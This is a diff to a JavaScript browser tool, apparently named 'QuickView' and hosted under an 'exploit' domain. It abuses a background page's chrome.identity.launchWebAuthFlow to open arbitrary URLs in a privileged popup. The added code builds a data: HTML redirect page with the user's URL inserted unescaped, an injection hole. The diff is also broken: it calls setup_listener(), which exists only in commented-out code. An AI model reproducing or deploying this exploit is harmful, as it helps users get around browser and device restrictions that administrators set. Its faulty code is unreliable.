@@ -3,8 +3,13 @@
     alert("You ran this script on the wrong page.");
     return;
   }
-  let from_id = (id) => {return document.getElementById(id)};
+  if (window.quickview) {
+    alert("QuickView is already active in this tab.");
+    return;
+  }
+  window.quickview = true;
 
+  let from_id = (id) => {return document.getElementById(id)};
   let style = `
   * {
     font-family: "Inter", sans-serif;
@@ -22,6 +27,12 @@
     font-size: 14px;
     padding: 10px;
   }
+
+  #title_div {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }  
 
   #input_div {
     display: flex;
@@ -53,6 +64,7 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width">
       <link rel="stylesheet" href="https://fonts.xz.style/serve/inter.css">
+      <link rel="icon" href="https://quickview-exploit.pages.dev/img/icon_32.png">
       <title>QuickView GUI</title>
       <style>
         ${style}
@@ -60,7 +72,10 @@
     </head> 
     <body>
       <div id="content">
-        <h1>QuickView GUI</h1>
+        <div id="title_div">
+          <img id="icon_img" src="https://quickview-exploit.pages.dev/img/icon.png" height="64px">
+          <h1>QuickView</h1>
+        </div>
         <div id="input_div">
           <input id="url_input" placeholder="Enter a URL here.">
           <a id="webview_button" class="button" href="#">Open Webview</a>
@@ -116,21 +131,51 @@
 
   function button_callback() {
     let url = from_id("url_input").value;
+    let popup_html = `data:text/html,
+    <html>
+      <head>
+        <script>
+          setTimeout(() => {
+            window.location.href = "${encodeURIComponent(url)}";
+          }, 500);
+        </script>
+      </head>
+      <body>
+        <p>Redirecting to ${url}</p>
+      </body>
+    </html>`;
     bg.chrome.identity.launchWebAuthFlow(
       {
-        url: url, 
+        url: popup_html, 
         interactive: true 
       }, 
-      () => {
-        console.log("returned for url "+url)
-      }
+      () => {}
     );
   }
+
+  /*
+  function setup_listener() {
+    if (bg.listner_active) {return}
+    bg.listner_active = true;
+
+    bg.chrome.tabs.onUpdated.addListener((tab_id, event, tab) => {
+      if (event.status !== "loading") return;
+      if (tab.url !== "https://www.google.com/#%20") return;
+
+      let url = bg.prompt("Which URL should be opened?", "https://google.com");
+      bg.chrome.identity.launchWebAuthFlow(
+        { url: url || "https://google.com", interactive: true },
+        () => {}
+      );
+    });
+  }
+  */
 
   async function init() {
     bg = await get_background();
     document.write(html);
     setup_page();
+    setup_listener();
     from_id("webview_button").onclick = button_callback;
   }
 
